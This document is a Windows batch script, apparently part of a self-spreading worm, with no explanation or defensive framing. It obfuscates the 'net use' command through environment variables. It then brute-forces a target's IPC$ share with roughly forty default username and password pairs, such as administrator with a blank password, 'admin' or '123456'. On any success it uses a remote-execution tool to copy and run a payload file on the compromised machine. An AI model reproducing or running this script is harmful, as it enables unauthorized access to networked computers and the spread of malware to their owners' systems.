@echo off
set F=u
set Z=s
set B=n
set L=e
set U=t
set G=e
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "xxyyzz" /user:administrator
if not errorlevel 1 goto bluesc4n29
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "abc" /user:administrator
if not errorlevel 1 goto bluesc4n30
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "student" /user:student
if not errorlevel 1 goto bluesc4n31
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "teacher" /user:teacher
if not errorlevel 1 goto bluesc4n32
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "" /user:user
if not errorlevel 1 goto bluesc4n33
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "user" /user:user
if not errorlevel 1 goto bluesc4n34
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto bluesc4n4
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "test123" /user:administrator
if not errorlevel 1 goto bluesc4n5
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "1" /user:administrator
if not errorlevel 1 goto bluesc4n26
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "123" /user:administrator
if not errorlevel 1 goto bluesc4n27
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "12345" /user:admin
if not errorlevel 1 goto bluesc4n28
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "temp" /user:administrator
if not errorlevel 1 goto bluesc4n6
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "" /user:administrator
if not errorlevel 1 goto bluesc4n1
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "" /user:administrator
if not errorlevel 1 goto bluesc4n35
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "Administrator" /user:administrator
if not errorlevel 1 goto bluesc4n2
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "Administrator" /user:administrator
if not errorlevel 1 goto bluesc4n37
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "test" /user:administrator
if not errorlevel 1 goto bluesc4n3
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "admin" /user:administrator
if not errorlevel 1 goto bluesc4n10
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "temp123" /user:administrator
if not errorlevel 1 goto bluesc4n7
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "pass" /user:administrator
if not errorlevel 1 goto bluesc4n8
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "password" /user:administrator
if not errorlevel 1 goto bluesc4n9
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto bluesc4n11
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "changeme" /user:administrator
if not errorlevel 1 goto bluesc4n12
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto bluesc4n13
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "123456" /user:administrator
if not errorlevel 1 goto bluesc4n14
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "654321" /user:administrator
if not errorlevel 1 goto bluesc4n15
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "abc123" /user:administrator
if not errorlevel 1 goto bluesc4n16
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "12345" /user:administrator
if not errorlevel 1 goto bluesc4n36
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "red123" /user:administrator
if not errorlevel 1 goto bluesc4n17
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "admin123" /user:administrator
if not errorlevel 1 goto bluesc4n18
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "qwerty" /user:administrator
if not errorlevel 1 goto bluesc4n19
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "asdf" /user:administrator
if not errorlevel 1 goto bluesc4n20
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "password123" /user:administrator
if not errorlevel 1 goto bluesc4n21
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "secret" /user:administrator
if not errorlevel 1 goto bluesc4n22
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "qwertyuiop" /user:administrator
if not errorlevel 1 goto bluesc4n23
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "12345" /user:administrator
if not errorlevel 1 goto bluesc4n24
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "54321" /user:administrator
if not errorlevel 1 goto bluesc4n25
goto bluesc4nend
:bluesc4n1
ipc \\%1 -u administrator -p "" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "" -f -c -d %2 -o
ipc \\%1 -u administrator -p "" -d %2 -o
goto bluesc4nend
:bluesc4n10
ipc \\%1 -u administrator -p "admin" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "admin" -f -c -d %2 -o
ipc \\%1 -u administrator -p "admin" -d %2 -o
goto bluesc4nend
:bluesc4n2
ipc \\%1 -u administrator -p "administrator" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "administrator" -f -c -d %2 -o
ipc \\%1 -u administrator -p "administrator" -d %2 -o
goto bluesc4nend
:bluesc4n37
ipc \\%1 -u administrator -p "Administrator" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "Administrator" -f -c -d %2 -o
ipc \\%1 -u administrator -p "Administrator" -d %2 -o
goto bluesc4nend
:bluesc4n11
ipc \\%1 -u root -p "root" -d attrib.exe -r %2
ipc \\%1 -u root -p "root" -f -c -d %2 -o
ipc \\%1 -u root -p "root" -d %2 -o
goto bluesc4nend
:bluesc4n13
ipc \\%1 -u admin -p "admin" -d attrib.exe -r %2
ipc \\%1 -u admin -p "admin" -f -c -d %2 -o
ipc \\%1 -u admin -p "admin" -d %2 -o
goto bluesc4nend
:bluesc4n3
ipc \\%1 -u administrator -p "test" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "test" -f -c -d %2 -o
ipc \\%1 -u administrator -p "test" -d %2 -o
goto bluesc4nend
:bluesc4n4
ipc \\%1 -u test -p "test" -d attrib.exe -r %2
ipc \\%1 -u test -p "test" -f -c -d %2 -o
ipc \\%1 -u test -p "test" -d %2 -o
goto bluesc4nend
:bluesc4n5
ipc \\%1 -u administrator -p "test123" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "test123" -f -c -d %2 -o
ipc \\%1 -u administrator -p "test123" -d %2 -o
goto bluesc4nend
:bluesc4n6
ipc \\%1 -u administrator -p "temp" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "temp" -f -c -d %2 -o
ipc \\%1 -u administrator -p "temp" -d %2 -o
goto bluesc4nend
:bluesc4n7
ipc \\%1 -u administrator -p "temp123" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "temp123" -f -c -d %2 -o
ipc \\%1 -u administrator -p "temp123" -d %2 -o
goto bluesc4nend
:bluesc4n8
ipc \\%1 -u administrator -p "pass" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "pass" -f -c -d %2 -o
ipc \\%1 -u administrator -p "pass" -d %2 -o
goto bluesc4nend
:bluesc4n9
ipc \\%1 -u administrator -p "password" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "password" -f -c -d %2 -o
ipc \\%1 -u administrator -p "password" -d %2 -o
goto bluesc4nend
:bluesc4n12
ipc \\%1 -u administrator -p "changeme" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "changeme" -f -c -d %2 -o
ipc \\%1 -u administrator -p "changeme" -d %2 -o
goto bluesc4nend
:bluesc4n14
ipc \\%1 -u administrator -p "123456" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "123456" -f -c -d %2 -o
ipc \\%1 -u administrator -p "123456" -d %2 -o
goto bluesc4nend
:bluesc4n15
ipc \\%1 -u administrator -p "654321" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "654321" -f -c -d %2 -o
ipc \\%1 -u administrator -p "654321" -d %2 -o
goto bluesc4nend
:bluesc4n16
ipc \\%1 -u administrator -p "abc123" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "abc123" -f -c -d %2 -o
ipc \\%1 -u administrator -p "abc123" -d %2 -o
goto bluesc4nend
:bluesc4n17
ipc \\%1 -u administrator -p "red123" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "red123" -f -c -d %2 -o
ipc \\%1 -u administrator -p "red123" -d %2 -o
goto bluesc4nend
:bluesc4n18
ipc \\%1 -u administrator -p "admin123" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "admin123" -f -c -d %2 -o
ipc \\%1 -u administrator -p "admin123" -d %2 -o
goto bluesc4nend
:bluesc4n19
ipc \\%1 -u administrator -p "qwerty" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "qwerty" -f -c -d %2 -o
ipc \\%1 -u administrator -p "qwerty" -d %2 -o
goto bluesc4nend
:bluesc4n20
ipc \\%1 -u administrator -p "asdf" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "asdf" -f -c -d %2 -o
ipc \\%1 -u administrator -p "asdf" -d %2 -o
goto bluesc4nend
:bluesc4n21
ipc \\%1 -u administrator -p "password123" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "password123" -f -c -d %2 -o
ipc \\%1 -u administrator -p "password123" -d %2 -o
goto bluesc4nend
:bluesc4n22
ipc \\%1 -u administrator -p "secret" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "secret" -f -c -d %2 -o
ipc \\%1 -u administrator -p "secret" -d %2 -o
goto bluesc4nend
:bluesc4n23
ipc \\%1 -u administrator -p "qwertyuiop" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "qwertyuiop" -f -c -d %2 -o
ipc \\%1 -u administrator -p "qwertyuiop" -d %2 -o
goto bluesc4nend
:bluesc4n24
ipc \\%1 -u administrator -p "12345" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "12345" -f -c -d %2 -o
ipc \\%1 -u administrator -p "12345" -d %2 -o
goto bluesc4nend
:bluesc4n25
ipc \\%1 -u administrator -p "54321" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "54321" -f -c -d %2 -o
ipc \\%1 -u administrator -p "54321" -d %2 -o
goto bluesc4nend
:bluesc4n26
ipc \\%1 -u administrator -p "1" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "1" -f -c -d %2 -o
ipc \\%1 -u administrator -p "1" -d %2 -o
goto bluesc4nend
:bluesc4n27
ipc \\%1 -u administrator -p "123" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "123" -f -c -d %2 -o
ipc \\%1 -u administrator -p "123" -d %2 -o
goto bluesc4nend
:bluesc4n28
ipc \\%1 -u admin -p "12345" -d attrib.exe -r %2
ipc \\%1 -u admin -p "12345" -f -c -d %2 -o
ipc \\%1 -u admin -p "12345" -d %2 -o
goto bluesc4nend
:bluesc4n29
ipc \\%1 -u administrator -p "xxyyzz" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "xxyyzz" -f -c -d %2 -o
ipc \\%1 -u administrator -p "xxyyzz" -d %2 -o
goto bluesc4nend
:bluesc4n30
ipc \\%1 -u administrator -p "abc" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "abc" -f -c -d %2 -o
ipc \\%1 -u administrator -p "abc" -d %2 -o
goto bluesc4nend
:bluesc4n31
ipc \\%1 -u student -p "student" -d attrib.exe -r %2
ipc \\%1 -u student -p "student" -f -c -d %2 -o
ipc \\%1 -u student -p "student" -d %2 -o
goto bluesc4nend
:bluesc4n32
ipc \\%1 -u teacher -p "teacher" -d attrib.exe -r %2
ipc \\%1 -u teacher -p "teacher" -f -c -d %2 -o
ipc \\%1 -u teacher -p "teacher" -d %2 -o
goto bluesc4nend
:bluesc4n33
ipc \\%1 -u user -p "" -d attrib.exe -r %2
ipc \\%1 -u user -p "" -f -c -d %2 -o
ipc \\%1 -u user -p "" -d %2 -o
goto bluesc4nend
:bluesc4n34
ipc \\%1 -u user -p "user" -d attrib.exe -r %2
ipc \\%1 -u user -p "user" -f -c -d %2 -o
ipc \\%1 -u user -p "user" -d %2 -o
goto bluesc4nend
:bluesc4n35
ipc \\%1 -u administrator -p "" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "" -f -c -d %2 -o
ipc \\%1 -u administrator -p "" -d %2 -o
goto bluesc4nend
:bluesc4n36
ipc \\%1 -u administrator -p "12345" -d attrib.exe -r %2
ipc \\%1 -u administrator -p "12345" -f -c -d %2 -o
ipc \\%1 -u administrator -p "12345" -d %2 -o
goto bluesc4nend
:bluesc4nend